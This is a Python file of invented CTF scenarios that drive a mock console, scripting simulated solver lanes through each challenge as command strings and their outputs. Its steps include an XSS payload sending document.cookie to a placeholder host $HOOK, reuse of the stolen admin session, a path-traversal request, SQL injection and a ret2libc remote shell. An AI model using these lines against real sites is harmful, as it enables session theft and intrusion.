"""Mock scenarios for the M0 console. Every name, description, flag and teammate here
is invented; none comes from a real event.

The special challenges each act out one cue from CONSOLE-SPEC.md (ignores the hint,
effort vs value, wrong direction, loop, stall, budget, teammate solved / box in use,
flag found). The rest of the board is generic lanes that solve, give up or keep going.
"""

from __future__ import annotations

import hashlib
import random
import re
from collections.abc import Callable
from dataclasses import dataclass, replace

from .. import fmt
from ..core.model import (
    ME,
    Alert,
    AlertKind,
    Challenge,
    ChallengeStatus,
    Lane,
    Pending,
    PendingKind,
    Suggestion,
)
from .script import Script, Step

EVENT = "Demo CTF"
FLAG_FORMAT = r"mock\{[a-z0-9_]+\}"
TEAMMATES = ("bravo", "delta")  # invented handles


# ---------------------------------------------------------------------- data types


@dataclass(frozen=True)
class Spec:
    """One challenge as the scenario defines it, plus the triage decision for its lane."""

    id: str
    category: str
    name: str
    points: int
    description: str
    files: tuple[str, ...] = ()
    live: bool = False
    solves: int = 0
    model: str = "glm"
    script: Callable[[str], Script] | None = None  # takes the flag; None: generic script
    token_cap: int | None = 1_000_000
    status: ChallengeStatus = ChallengeStatus.NEW
    solved_by: str | None = None
    note: str = ""

    def challenge(self) -> Challenge:
        return Challenge(
            id=self.id,
            name=self.name,
            category=self.category,
            points=self.points,
            solves=self.solves,
            description=self.description,
            files=self.files,
            live=self.live,
            status=self.status,
            solved_by=self.solved_by,
            note=self.note,
        )


@dataclass(frozen=True)
class ReleaseAt:
    ids: tuple[str, ...]
    label: str


@dataclass(frozen=True)
class TeammateSolve:
    challenge: str
    who: str


@dataclass(frozen=True)
class TeammateClaim:
    challenge: str
    who: str


TimelineEvent = ReleaseAt | TeammateSolve | TeammateClaim


@dataclass(frozen=True)
class Scenario:
    name: str
    summary: str
    specs: tuple[Spec, ...]
    timeline: tuple[tuple[int, TimelineEvent], ...]  # (tick, event)
    team: bool = False
    containerized: bool = True
    max_lanes: int = 16
    prerun: int = 0  # ticks played before the console opens (an event in progress)
    start_at: float = 0.0  # event clock at tick 0, in seconds
    seed: int = 7
    event: str = EVENT

    def spec(self, challenge_id: str) -> Spec:
        return next(s for s in self.specs if s.id == challenge_id)


def flag_for(spec: Spec, seed: int) -> str:
    slug = re.sub(r"[^a-z0-9]+", "_", spec.name.lower()).strip("_")
    tail = hashlib.sha256(f"{seed}:{spec.id}".encode()).hexdigest()[:4]
    return f"mock{{{slug}_{tail}}}"


def paced(steps: tuple[Step, ...], every: int) -> tuple[Step, ...]:
    return tuple(replace(s, every=every) for s in steps)


# ---------------------------------------------------------------------- special lanes


def static_hiss(flag: str) -> Script:
    """SSTV: the description hints at slow-scan TV; the lane compares stereo channels."""

    def ignores_hint(lane: Lane, ch: Challenge) -> Alert:
        return Alert(
            AlertKind.HINT,
            "The description hints at slow-scan TV (\"a picture in it if you scan it slowly "
            "enough\") and sox puts the energy at 1.5 to 2.3 kHz, but the lane has spent "
            f"{lane.turns - 2} turns comparing the stereo channels.",
            (
                Suggestion(
                    "r",
                    "Redirect with the hinted technique",
                    "Decode static_hiss.wav as SSTV (slow-scan TV, e.g. Robot 36 or Martin M1) and read the picture",
                ),
                Suggestion("h", "Hint", "Think slow-scan TV, not stereo tricks"),
            ),
        )

    main = (
        Step("file static_hiss.wav", "RIFF (little-endian) data, WAVE audio, 16 bit, stereo 44100 Hz"),
        Step("sox static_hiss.wav -n stat", "Length 36.2 s · RMS amplitude 0.21 · Rough frequency 1764"),
        Step("python3 split_channels.py static_hiss.wav", "wrote left.wav and right.wav", artifacts=("left.wav", "right.wav")),
        Step("python3 diff_channels.py left.wav right.wav", "max |L-R| = 0.0004 over 1.6M samples"),
        Step("python3 lsb_extract.py left.wav --bits 1", "no printable run longer than 4 bytes"),
        Step("python3 diff_channels.py --invert-phase left.wav right.wav", "the residual has no structure above the noise floor", alert=ignores_hint),
        Step("python3 lsb_extract.py right.wav --bits 2", "no printable run longer than 4 bytes"),
        Step("python3 xor_channels.py left.wav right.wav", "output entropy 7.99 bits/byte"),
        Step("python3 diff_channels.py --window 512 left.wav right.wav", "no window rises above the noise floor"),
    )
    sstv = (
        Step("python3 -m sstv -d static_hiss.wav -o decoded.png", "[+] mode Robot 36 · 240 lines · wrote decoded.png", artifacts=("decoded.png",)),
        Step("python3 ocr.py decoded.png", f"text in the picture: {flag}", flag=flag),
    )
    sstv_plan = "Decode the audio as slow-scan TV and read the picture"
    return Script(
        plan="Look for data hidden between the stereo channels of static_hiss.wav",
        steps=paced(main, 2),
        repeat_from=6,
        on_redirect=sstv,
        on_hint=(Step("re-reads the description: \"scan it slowly\" means SSTV", "switching to an SSTV decoder", plan=sstv_plan), *sstv),
        fresh=Script(plan=sstv_plan, steps=(Step("file static_hiss.wav", "WAVE audio, stereo 44100 Hz"), *sstv)),
    )


OVERTHINK = (
    ("cat second_guess.txt", "214 letters; braces and underscores kept"),
    ("python3 freq.py second_guess.txt", "index of coincidence 0.066: monoalphabetic"),
    ("python3 kasiski.py second_guess.txt", "no repeated trigrams with useful spacing"),
    ("python3 vigenere_crack.py --max-key 24", "best key length 7, score 0.41 (noise)"),
    ("python3 affine_brute.py second_guess.txt", "best (a, b) = (11, 4), score 0.37 (noise)"),
    ("python3 hill2x2.py --crib mock", "no invertible 2x2 key fits the crib"),
    ("python3 z3_alphabet.py --unknown-permutation", "unsat after 412 s"),
    ("python3 enigma_sim.py --rotors I,II,III --brute-rings", "no crib match in 17 576 settings"),
    ("python3 playfair_anneal.py --iterations 2e6", "best score -812.4 (gibberish)"),
    ("python3 transposition_search.py --max-cols 12", "no column order beats the baseline"),
    ("python3 homophonic_solver.py --restarts 400", "400 of 400 restarts end in gibberish"),
    ("python3 notes.py --summarise", "hypothesis: layered polyalphabetic with a keyed alphabet"),
    ("python3 vigenere_crack.py --keyed-alphabet --max-key 30", "best key length 11, score 0.39 (noise)"),
)


def second_guess(flag: str) -> Script:
    """Overthinking: a 50-pointer with hundreds of solves gets a cryptanalysis marathon."""

    def effort(lane: Lane, ch: Challenge) -> Alert:
        return Alert(
            AlertKind.EFFORT,
            f"{lane.turns} turns, {fmt.tokens(lane.tokens)} tokens and ${fmt.dollars(lane.dollars)} "
            f"on a {ch.points}-point challenge that {ch.solves} teams have solved. "
            "The work is far more complex than the points suggest.",
            (
                Suggestion("h", "Hint: it is simpler than this", "It's simpler than this: two shifts make one shift. Try all 26 Caesar shifts."),
                Suggestion("k", "Kill and re-queue fresh"),
            ),
        )

    steps = [Step(*OVERTHINK[i % len(OVERTHINK)]) for i in range(39)]
    steps.append(Step(*OVERTHINK[39 % len(OVERTHINK)], alert=effort))
    steps += [Step(*OVERTHINK[i % len(OVERTHINK)]) for i in range(40, 40 + len(OVERTHINK))]
    caesar = Step("python3 caesar_all.py second_guess.txt", f"shift 11: {flag}", flag=flag)
    return Script(
        plan="Work out which polyalphabetic cipher this is and break it",
        steps=tuple(steps),
        repeat_from=40,
        on_hint=(replace(caesar, plan="Try every Caesar shift: two shifts are one shift"),),
        fresh=Script(
            plan="Start simple: frequency check, then every Caesar shift",
            steps=(Step(*OVERTHINK[0]), Step(*OVERTHINK[1]), caesar),
        ),
        base_tokens=7_000,
        growth=260,
    )


SCANNERS = ("ffuf", "gobuster", "feroxbuster", "dirsearch")


def paper_trail(flag: str) -> Script:
    """Web wrong way: brute-forcing directories while the source is in the handout."""

    def wrong_way(lane: Lane, ch: Challenge) -> Alert:
        scans = sum(1 for a in lane.actions if a.text.startswith(SCANNERS))
        return Alert(
            AlertKind.DIRECTION,
            f"{scans} brute-force scans of the instance found no new paths, while the full source "
            f"is in the handout ({', '.join(ch.files)}) and has not been opened.",
            (
                Suggestion(
                    "r",
                    "Redirect: read the source",
                    "Stop fuzzing. Unzip paper_trail_src.zip, read the routes and find how the export picks its file",
                ),
                Suggestion("f", "Fork with a source-first approach", "Source first: read paper_trail_src.zip before touching the instance"),
            ),
        )

    main = (
        Step("curl -si $TARGET/ | head -5", "HTTP/1.1 200 OK · Server: gunicorn"),
        Step("ffuf -w raft-medium-directories.txt -u $TARGET/FUZZ", "30 000 requests · 3 paths: /login /static /tickets"),
        Step("ffuf -w raft-large-files.txt -u $TARGET/FUZZ", "37 000 requests · no new paths"),
        Step("gobuster dir -u $TARGET -w big.txt -x php,bak,old", "20 469 requests · no new paths"),
        Step("ffuf -w burp-parameter-names.txt -u '$TARGET/tickets?FUZZ=1'", "6 453 requests · no new parameters", alert=wrong_way),
        Step("feroxbuster -u $TARGET -w directory-list-big.txt --depth 3", "220 000 requests · 429 Too Many Requests x41"),
        Step("ffuf -w raft-large-words.txt -u $TARGET/tickets/FUZZ", "119 600 requests · no new paths"),
        Step("dirsearch -u $TARGET -e py,zip,bak", "11 714 requests · no new paths"),
    )
    source = (
        Step("unzip -o paper_trail_src.zip -d src", "app.py · export.py · templates/ (14 files)", artifacts=("src/",)),
        Step("grep -n 'send_file\\|route' src/export.py", "41: path = os.path.join(EXPORT_DIR, request.args['name'])  # not normalised"),
        Step("curl -s \"$TARGET/export?name=../../flag.txt\"", flag, flag=flag),
    )
    source_first = Script(plan="Source first: read paper_trail_src.zip before touching the instance", steps=source)
    return Script(
        plan="Find hidden endpoints on the instance by brute force",
        steps=paced(main, 2),
        repeat_from=5,
        on_redirect=source,
        on_hint=source,
        fork=source_first,
        fresh=source_first,
    )


def ticket_desk(flag: str) -> Script:
    """Flag found: a clean solve that waits for the player to approve the submit."""
    steps = (
        Step("unzip -l ticket_desk.zip", "app.py · bot.js · templates/ticket.html"),
        Step("grep -rn 'safe\\|innerHTML' ticket_desk/", "templates/ticket.html:22: {{ body|safe }}"),
        Step("sed -n 1,40p ticket_desk/bot.js", "the bot logs in as admin, opens /ticket/<id>, waits 3 s"),
        Step("python3 make_payload.py --exfil $HOOK > payload.txt", "<img src=x onerror=fetch('$HOOK/?c='+document.cookie)>", artifacts=("payload.txt",)),
        Step("curl -s -X POST $TARGET/ticket --data-binary @payload.txt", "[+] ticket #4471 created"),
        Step("curl -s $HOOK/log | tail -1", "GET /?c=session=<admin session, 64 chars>", artifacts=("admin session",)),
        Step("curl -s -b session=$ADMIN $TARGET/admin/flag", flag, flag=flag),
    )
    return Script(plan="Read the bot's code, then make it leak its admin session", steps=steps)


def night_shift(flag: str) -> Script:
    """Team: a teammate solves this while the lane is still on it."""
    steps = (
        Step("file night_shift", "ELF 64-bit LSB pie executable, x86-64, stripped"),
        Step("strings -n 8 night_shift | head", "Enter badge code: · Clocked out. Good night. · Wrong badge."),
        Step("r2 -qc 'aaa; afl~check' night_shift", "0x1290  check_badge (412 bytes)"),
        Step("r2 -qc 'pdf @ 0x1290' night_shift | head -60", "xor loop over 24 bytes against a table at 0x4020"),
        Step("python3 extract_table.py night_shift 0x4020 24", "wrote table.bin (24 bytes)", artifacts=("table.bin",)),
        Step("python3 invert_xor.py table.bin", "bytes 0-8 decode; 9-23 depend on a rolling key"),
        Step("r2 -qc 'pdf @ 0x1340' night_shift", "rolling key = previous byte rotated left by 3"),
        Step("python3 solve_rolling.py table.bin", "bytes 9-15 recovered; 16-23 still off by one"),
        Step("python3 solve_rolling.py table.bin --rotate 5", "checking the rotation amount for bytes 16-23"),
        Step("r2 -qc 'pdf @ 0x13a0' night_shift", "a second key schedule starts at byte 16"),
    )
    return Script(plan="Recover the badge-code check from night_shift", steps=paced(steps, 2), repeat_from=7)


def harbor_master(flag: str) -> Script:
    """Team: a teammate holds the live box; then the lane asks to use it (approval)."""

    def box_in_use(lane: Lane, ch: Challenge) -> Alert:
        return Alert(
            AlertKind.TEAMMATE,
            f"delta holds the live instance of {ch.name}. The lane is kept off the box and works "
            "on the handout locally until delta releases it.",
            (Suggestion("", "Nothing to do: the lane stays off the box by itself"),),
        )

    offline = "Build the exploit against the handout locally until the box is free"
    steps = (
        Step("checksec --file=harbor_master", "Partial RELRO · No canary · NX enabled · No PIE"),
        Step("r2 -qc 'pdf @ sym.add_ship' harbor_master", "fgets(buf, 0x100, stdin) into a 0x40-byte stack buffer"),
        Step("request the live instance", "held by delta (team)", alert=box_in_use, plan=offline, team_only=True),
        Step("python3 find_offset.py harbor_master", "saved RIP at offset 72"),
        Step("ROPgadget --binary harbor_master | grep 'pop rdi'", "0x401273 : pop rdi ; ret"),
        Step("python3 exploit.py --print-chain", "ret2plt leak of puts, then ret2libc: 6 gadgets"),
        Step("python3 exploit.py LOCAL --dry-run", "payload is 152 bytes; no bad bytes"),
        Step("python3 exploit.py --print-chain --align", "added a ret for stack alignment"),
        Step("python3 libc_offsets.py libc.so.6", "offsets for puts, system and /bin/sh loaded"),
        Step("python3 exploit.py LOCAL --dry-run --stage 2", "stage 2 is 64 bytes"),
        Step("python3 exploit.py --lint", "no problems found"),
        Step("check the live instance", "delta released the box", clear=(AlertKind.TEAMMATE,), team_only=True),
        Step(
            "request live-instance access",
            "instance access needs your approval",
            pending=Pending(PendingKind.LIVE_BOX, "connect to the live instance of Harbor Master"),
        ),
    )
    on_box = (
        Step("python3 exploit.py REMOTE", "[+] leaked puts@libc · [+] shell on the instance"),
        Step("cat flag.txt  (remote shell)", flag, flag=flag),
    )
    return Script(plan="Find the overflow in the ship log and build a ROP chain", steps=paced(steps, 4), on_box=on_box, base_tokens=5_000)


def gearbox(flag: str) -> Script:
    """Loop: the same command, again and again."""
    cmd = "python3 angr_solve.py gearbox"

    def looping(lane: Lane, ch: Challenge) -> Alert:
        repeats = 0
        for action in reversed(lane.actions):
            if action.text != cmd:
                break
            repeats += 1
        return Alert(
            AlertKind.LOOP,
            f"The same command ran {repeats} times in a row: {cmd} (every run timed out after 300 s).",
            (
                Suggestion("h", "Hint", "angr keeps timing out. Lift the 32 rounds into z3 by hand instead of exploring paths"),
                Suggestion("k", "Kill and re-queue fresh"),
            ),
        )

    timeout = "timeout after 300 s (path explosion)"
    lift = (
        Step("python3 lift_rounds.py gearbox > rounds.py", "lifted 32 rounds into z3 constraints", artifacts=("rounds.py",)),
        Step("python3 rounds.py", f"sat: {flag}", flag=flag),
    )
    return Script(
        plan="Let angr find the input that passes all 32 rounds",
        steps=(
            Step("file gearbox", "ELF 64-bit LSB executable, statically linked, stripped"),
            Step("r2 -qc 'aaa; pdf @ main' gearbox | head -60", "reads 32 bytes; 32 rounds of rotate and xor; compares with a table"),
            Step(cmd, timeout),
            Step(cmd, timeout),
            Step(cmd, timeout),
            Step(cmd, timeout, alert=looping),
            Step(cmd, timeout),
        ),
        repeat_from=6,
        on_hint=lift,
        fresh=Script(plan="Lift the rounds into z3 by hand", steps=(Step("file gearbox", "statically linked, stripped"), *lift)),
    )


def quiet_ledger(flag: str) -> Script:
    """Stall: no new artifact or hypothesis for many turns."""

    def stalled(lane: Lane, ch: Challenge) -> Alert:
        last = lane.artifacts[-1] if lane.artifacts else "none"
        return Alert(
            AlertKind.STALL,
            f"No new artifact or hypothesis for {lane.turns - 4} turns; the last new finding ({last}) was at turn 4.",
            (
                Suggestion("e", "Escalate to a stronger model with a summary"),
                Suggestion("h", "Hint", "Look at how verify.py makes its nonces"),
            ),
        )

    vague = (
        ("re-reads verify.py", "no new observations"),
        ("python3 lattice_attack.py --known-bits 4", "no short vector found"),
        ("python3 check_nonces.py ledger.json --pairs", "no repeated r values"),
        ("re-reads the challenge description", "no new observations"),
        ("python3 lattice_attack.py --known-bits 8 --dim 60", "no short vector found"),
        ("python3 hash_check.py ledger.json", "hashes match the signed messages"),
    )
    steps = [
        Step("python3 -c 'import json; print(len(json.load(open(\"ledger.json\"))))'", "512 signed entries"),
        Step("python3 parse_sigs.py ledger.json > sigs.csv", "wrote sigs.csv (512 rows)", artifacts=("sigs.csv",)),
        Step("python3 check_nonces.py ledger.json", "all 512 r values distinct"),
        Step("python3 curve_params.py verify.py", "secp256k1; nonce from a custom PRNG", artifacts=("curve params",)),
    ]
    steps += [Step(*vague[i % len(vague)]) for i in range(11)]
    steps.append(Step(*vague[11 % len(vague)], alert=stalled))
    steps += [Step(*v) for v in vague]
    biased = (
        Step("python3 bias_scan.py sigs.csv", "the top 6 bits of every nonce are zero", artifacts=("nonce bias",)),
        Step("python3 hnp_lattice.py sigs.csv --known-bits 6", "[+] recovered the signing key", artifacts=("private key",)),
        Step("python3 sign.py --forge 'transfer: flag'", flag, flag=flag),
    )
    return Script(
        plan="Find the weakness in the ledger's signatures",
        steps=tuple(steps),
        repeat_from=16,
        on_escalate=(Step("reads the summary; checks nonce generation first", "verify.py masks the PRNG output", plan="Biased-nonce lattice attack"), *biased),
        on_hint=biased,
    )


def deep_archive(flag: str) -> Script:
    """Budget: heavy outputs push the lane to its cap; it waits for more."""
    steps = (
        Step("zstd -d archive.img.zst", "archive.img: 12.0 GiB"),
        Step("mmls archive.img", "GPT · 3 partitions (EFI, root, data)"),
        Step("fls -r -o 1050624 archive.img | wc -l", "184 211 entries"),
        Step("tsk_recover -o 1050624 archive.img out/", "recovered 184 211 files", artifacts=("out/",)),
        Step("grep -rla 'mock{' out/ | head", "no matches"),
        Step("bulk_extractor -o be archive.img", "12 840 email addresses · 3 211 URLs"),
        Step("photorec /d carve /cmd archive.img search", "carved 9 412 files", artifacts=("carve/",)),
        Step("grep -rla 'mock{' carve/ | head", "no matches"),
        Step("python3 entropy_map.py archive.img", "high-entropy run from 7.1 to 7.4 GiB"),
        Step("python3 carve_range.py archive.img 7.1G 7.4G", "wrote blob.bin (300 MiB)", artifacts=("blob.bin",)),
        Step("binwalk blob.bin", "LUKS header at offset 0"),
        Step("python3 luks_dump.py blob.bin", "LUKS2 · pbkdf2 · 1 key slot"),
        Step("grep -ri 'cryptsetup' out/home/*/.bash_history", "ops typed the passphrase on the next line"),
        Step("python3 history_context.py out/home/ops/.bash_history", "passphrase candidates: 4", artifacts=("passphrase candidates",)),
        Step("python3 luks_try.py blob.bin candidates.txt", "[+] unlocked with candidate 3"),
        Step("find /mnt/blob -name '*.txt' | head", "/mnt/blob/notes.txt"),
        Step("cat /mnt/blob/notes.txt", flag, flag=flag),
    )
    return Script(plan="Recover deleted and hidden data from the archive image", steps=tuple(replace(s, tokens=30_000) for s in steps))


# ---------------------------------------------------------------------- generic lanes

GENERIC_PLANS = {
    "web": "Read the source, map the routes, then test the input handling",
    "for": "Identify the file types, carve what is inside, then look for hidden data",
    "rev": "Find the check, lift it, then solve for the key",
    "pwn": "Find the bug, build the exploit locally, then fire it at the instance",
    "cry": "Identify the scheme and its weakness, then recover the plaintext",
    "misc": "Probe the service and find out what it really allows",
    "osint": "Pull every clue out of the image and narrow the place down",
}

GENERIC_STEPS = {
    "web": (
        ("curl -si $TARGET/ | head -5", "HTTP/1.1 200 OK · Server: nginx"),
        ("unzip -l handout.zip", "app.py · requirements.txt · templates/ (9 files)"),
        ("grep -rn 'request.args\\|request.form' src/ | head", "6 handlers read parameters directly"),
        ("curl -s \"$TARGET/api/item?id=1'\"", "500 Internal Server Error"),
        ("sqlmap -u \"$TARGET/api/item?id=1\" --batch --level 2", "[INFO] GET parameter 'id' looks boolean-based blind injectable"),
        ("python3 dump.py --table users", "[+] 3 rows dumped"),
        ("curl -s -b session=$S $TARGET/admin", "403 Forbidden: admins only"),
        ("python3 forge_session.py --secret-from config.py", "[+] forged an admin session"),
    ),
    "for": (
        ("file evidence.bin", "evidence.bin: data"),
        ("binwalk -e evidence.bin", "0x0 Zip archive data · 0x1f40 PNG image"),
        ("exiftool -a -G1 extracted.png | head", "[File] File Type: PNG · [PNG] Comment: (empty)"),
        ("zsteg -a extracted.png | head", "b1,rgb,lsb,xy .. text: \"nothing here\""),
        ("strings -el evidence.bin | grep -i pass", "no matches"),
        ("python3 carve.py evidence.bin", "[+] carved 3 files"),
        ("vol -f memory.raw windows.pslist | head", "PID 4 System · PID 1984 notepad.exe"),
        ("tshark -r capture.pcapng -q -z conv,tcp", "14 TCP conversations"),
    ),
    "rev": (
        ("file chall", "ELF 64-bit LSB pie executable, x86-64, stripped"),
        ("strings -n 8 chall | head", "Enter the key: · Correct! · Nope."),
        ("r2 -qc 'aaa; afl' chall | wc -l", "187 functions"),
        ("r2 -qc 'pdf @ main' chall | head -60", "reads 32 bytes, calls 0x1460 in a loop"),
        ("ghidra-headless chall -postScript Decompile.py", "[INFO] wrote decompiled.c (2 214 lines)"),
        ("python3 emulate.py chall --func 0x1460", "[*] emulated 32 rounds"),
        ("python3 z3_solve.py", "sat after 3.1 s"),
        ("python3 check_key.py --static", "the key passes the recovered checks"),
    ),
    "pwn": (
        ("checksec --file=chall", "Full RELRO · Canary found · NX enabled · PIE enabled"),
        ("r2 -qc 'pdf @ sym.vuln' chall", "printf(buf) with user input"),
        ("python3 exploit.py --leak-only", "[*] leaked the canary and a PIE address"),
        ("ROPgadget --binary chall | grep 'pop rdi'", "0x1273 : pop rdi ; ret"),
        ("python3 exploit.py LOCAL --dry-run", "[*] payload 136 bytes, no bad bytes"),
        ("python3 heap_layout.py", "tcache: 3 chunks of 0x40"),
        ("python3 exploit.py REMOTE", "[*] stage 1 sent"),
        ("python3 exploit.py REMOTE --stage 2", "[+] got a shell"),
    ),
    "cry": (
        ("cat output.txt", "n = 0xc35a... (2048 bits) · e = 65537 · c = 0x8f1b..."),
        ("python3 params.py output.txt", "p and q share their top 300 bits"),
        ("sage -python fermat.py", "[+] factored n in 4 iterations"),
        ("python3 oracle_probe.py --rounds 64", "the oracle leaks one bit per query"),
        ("python3 lll_attack.py --dim 40", "short vector found"),
        ("python3 stats.py ciphertexts.txt", "bias at byte 3: 0.012"),
        ("python3 decrypt.py", "[+] plaintext recovered"),
        ("python3 verify_plaintext.py", "padding checks out"),
    ),
    "misc": (
        ("cat README.txt", "connect with nc and answer 100 questions"),
        ("python3 probe_service.py", "[*] allowed: sorted, len, print"),
        ("python3 jail_escape.py --dry-run", "the payload uses only allowed builtins"),
        ("python3 solve_service.py --rounds 100", "[*] round 37/100"),
        ("file data.mid", "data.mid: Standard MIDI data"),
        ("python3 notes_to_text.py data.mid", "decoded 31 notes"),
        ("python3 polyglot_check.py pizza.pdf", "valid as PDF, ZIP and HTML"),
        ("python3 solve_service.py --rounds 100 --fast", "[*] round 100/100"),
    ),
    "osint": (
        ("exiftool photo.jpg | grep -i gps", "no GPS tags"),
        ("python3 landmarks.py photo.jpg", "candidates: harbour crane, red tram, clock tower"),
        ("python3 shadow_angle.py photo.jpg", "late afternoon, camera facing west"),
        ("compare street-level imagery for 4 candidate streets", "best match: candidate 3"),
        ("python3 timetable_diff.py schedule.pdf", "the 07:40 sailing moved to 07:55 last year"),
        ("check archived copies of the old forum", "a 2021 post shows a shop sign"),
        ("python3 sign_ocr.py post_photo.jpg", "sign reads 'Rope & Anchor'"),
        ("python3 format_answer.py", "candidate street name ready"),
    ),
}


def generic(spec: Spec, flag: str, seed: int) -> Script:
    """A plausible lane for the category: it solves, gives up, or keeps going."""
    rng = random.Random(f"{seed}:{spec.id}")
    pool = GENERIC_STEPS[spec.category]
    length = rng.randint(6, 20)
    every = rng.choice((1, 2, 2, 3))
    start = rng.randrange(len(pool))
    steps = [Step(*pool[(start + i) % len(pool)], every=every) for i in range(length)]
    roll = rng.random()
    repeat_from = None
    if roll < 0.6:
        steps.append(Step("python3 solve.py", f"candidate: {flag}", flag=flag, every=every))
    elif roll < 0.8:
        steps.append(Step("writes up what it tried", "no promising lead left", gave_up=f"no lead after {length + 1} turns", every=every))
    else:
        repeat_from = length // 2
    return Script(plan=GENERIC_PLANS[spec.category], steps=tuple(steps), repeat_from=repeat_from)


def scripts_for(scenario: Scenario) -> dict[str, Script]:
    flags = flags_for(scenario)
    return {
        s.id: s.script(flags[s.id]) if s.script else generic(s, flags[s.id], scenario.seed)
        for s in scenario.specs
    }


def flags_for(scenario: Scenario) -> dict[str, str]:
    return {s.id: flag_for(s, scenario.seed) for s in scenario.specs}


# ---------------------------------------------------------------------- the board


def _g(id: str, cat: str, name: str, pts: int, desc: str, files: tuple[str, ...] = (), live: bool = False, model: str = "glm") -> Spec:
    return Spec(id, cat, name, pts, desc, files, live, model=model)


WAVE_GENERIC = (
    _g("lantern-api", "web", "Lantern API", 150, "A JSON API for a lighthouse rota. The admin route is documented elsewhere.", ("lantern_api.zip",), True),
    _g("mirror-maze", "web", "Mirror Maze", 200, "Every page links to a copy of itself. One copy is not like the others.", (), True),
    _g("form-letter", "web", "Form Letter", 100, "Fill in the template and the mail merge does the rest. Maybe too much of the rest.", ("form_letter.zip",), True),
    _g("stale-session", "web", "Stale Session", 250, "Logging out only logs out the browser.", (), True, "sonnet"),
    _g("guestbook-deluxe", "web", "Guestbook Deluxe", 300, "Our guestbook now renders Markdown, emoji and [a few safe HTML tags].", ("guestbook.zip",), True, "sonnet"),
    _g("parcel-tracker", "web", "Parcel Tracker", 350, "Track any parcel by number. Internal parcels have very round numbers.", (), True),
    _g("muddy-footprints", "for", "Muddy Footprints", 100, "Someone walked through the server room after the rain. The disk image remembers.", ("footprints.img.gz",)),
    _g("shredded-memo", "for", "Shredded Memo", 150, "The memo went through a strip-cut shredder. We scanned every strip.", ("strips.zip",)),
    _g("ghost-partition", "for", "Ghost Partition", 200, "The partition table lists two partitions. The disk disagrees.", ("ghost.dd.zst",)),
    _g("pocket-litter", "for", "Pocket Litter", 100, "Everything in a suspect's pockets, photographed. Start with the receipt.", ("pocket.jpg",)),
    _g("timecard", "for", "Timecard", 250, "Who clocked in at 03:12? The access log has gaps.", ("access.evtx",), model="sonnet"),
    _g("faded-polaroid", "for", "Faded Polaroid", 150, "An instant photo left in the sun. Something is still in there.", ("polaroid.png",)),
    _g("clockwork-key", "rev", "Clockwork Key", 200, "Wind it up and it checks your key, one tooth at a time.", ("clockwork",)),
    _g("tin-soldier", "rev", "Tin Soldier", 100, "A toy program that marches through your input.", ("tin_soldier",)),
    _g("folded-map", "rev", "Folded Map", 250, "The map only makes sense when it is folded the right way.", ("folded_map.apk",), model="sonnet"),
    _g("lighthouse-vm", "rev", "Lighthouse VM", 400, "A tiny virtual machine keeps the light on. Its bytecode keeps a secret.", ("lighthouse_vm", "program.bin"), model="sonnet"),
    _g("origami", "rev", "Origami", 150, "Unfold the packed binary and see what is inside.", ("origami",)),
    _g("spin-cycle", "rev", "Spin Cycle", 300, "The checker spins your input through a wash cycle of rotations.", ("spin_cycle",)),
    _g("bread-line", "pwn", "Bread Line", 100, "Take a number and wait in line. Everyone gets a slice.", ("bread_line",), True),
    _g("coat-check", "pwn", "Coat Check", 200, "Hand in a coat, get a ticket. Lose the ticket and you lose the coat, or someone else's.", ("coat_check",), True),
    _g("pressure-valve", "pwn", "Pressure Valve", 250, "The valve controller trusts the gauge to report sizes honestly.", ("valve",), True),
    _g("spare-room", "pwn", "Spare Room", 300, "There is always a spare room on the heap if you ask nicely.", ("spare_room",), True, "sonnet"),
    _g("tollbooth", "pwn", "Tollbooth", 150, "Pay the toll in exact change. The machine reads your coins with printf.", ("tollbooth",), True),
    _g("short-fuse", "pwn", "Short Fuse", 350, "A kernel module with a very short timer.", ("bzImage", "fuse.ko"), True, "sonnet"),
    _g("bent-coin", "cry", "Bent Coin", 100, "Our coin flips are fair. Mostly.", ("bent_coin.py",)),
    _g("lucky-sevens", "cry", "Lucky Sevens", 150, "RSA with e = 7. What could go wrong?", ("lucky.txt",)),
    _g("square-dance", "cry", "Square Dance", 200, "Partners swap, squares shuffle. The key is in the choreography.", ("square_dance.py",)),
    _g("paper-moon", "cry", "Paper Moon", 250, "A home-made stream cipher seeded from the phase of the moon.", ("moon.py", "out.txt")),
    _g("rusty-knapsack", "cry", "Rusty Knapsack", 300, "A knapsack cryptosystem, freshly dusted off.", ("knapsack.txt",), model="sonnet"),
    _g("slow-drip", "cry", "Slow Drip", 200, "The padding oracle answers. Eventually.", (), True),
    _g("sandbox-sorter", "misc", "Sandbox Sorter", 150, "A Python jail that only lets you sort things.", (), True),
    _g("jukebox", "misc", "Jukebox", 100, "Pick a song. The jukebox plays notes, and notes are just numbers.", ("jukebox.mid",)),
    _g("polyglot-pizza", "misc", "Polyglot Pizza", 200, "One file, many crusts: a valid PDF, a valid ZIP and something else.", ("pizza.pdf",)),
    _g("lost-socks", "misc", "Lost Socks", 100, "Pair up the socks. The odd one out holds the flag.", ("socks.txt",)),
    _g("treasure-hunt", "misc", "Treasure Hunt", 250, "Seven clues, seven services, one flag.", (), True),
    _g("postcard", "osint", "Postcard", 100, "Greetings from somewhere. Where was this photo taken?", ("postcard.jpg",)),
    _g("rooftop-view", "osint", "Rooftop View", 150, "Find the building this photo was taken from. The flag is the street name.", ("rooftop.jpg",)),
    _g("ferry-schedule", "osint", "Ferry Schedule", 200, "Which ferry did our suspect take? The timetable changed last year.", ("schedule.pdf",)),
    _g("mountain-pass", "osint", "Mountain Pass", 150, "The trail camera caught a hiker. Name the pass.", ("trailcam.jpg",)),
    _g("old-forum", "osint", "Old Forum", 250, "Our target posted on a forum that no longer exists."),
)

GEARBOX = Spec("gearbox", "rev", "Gearbox", 200, "Every gear turns the next. Find the input that makes them all line up.", ("gearbox",), script=gearbox)
QUIET_LEDGER = Spec("quiet-ledger", "cry", "Quiet Ledger", 300, "The bank's ledger signs every entry. Some signatures look a little too alike.", ("ledger.json", "verify.py"), script=quiet_ledger)
DEEP_ARCHIVE = Spec(
    "deep-archive", "for", "Deep Archive", 400, "We imaged the archive server before it died. Twelve gigabytes of mostly nothing.",
    ("archive.img.zst",), model="sonnet", script=deep_archive, token_cap=400_000,
)

# The triaged wave: the three pathological lanes first, then the rest, cheapest first.
WAVE = (GEARBOX, QUIET_LEDGER, DEEP_ARCHIVE, *sorted(WAVE_GENERIC, key=lambda s: (s.points, s.category, s.name)))
assert len(WAVE) == 43

FIRST_LIGHT = Spec("first-light", "misc", "First Light", 10, "The flag is in the rules. Read them!", solves=412, status=ChallengeStatus.SOLVED, solved_by=ME)
FIELD_TRIP = Spec(
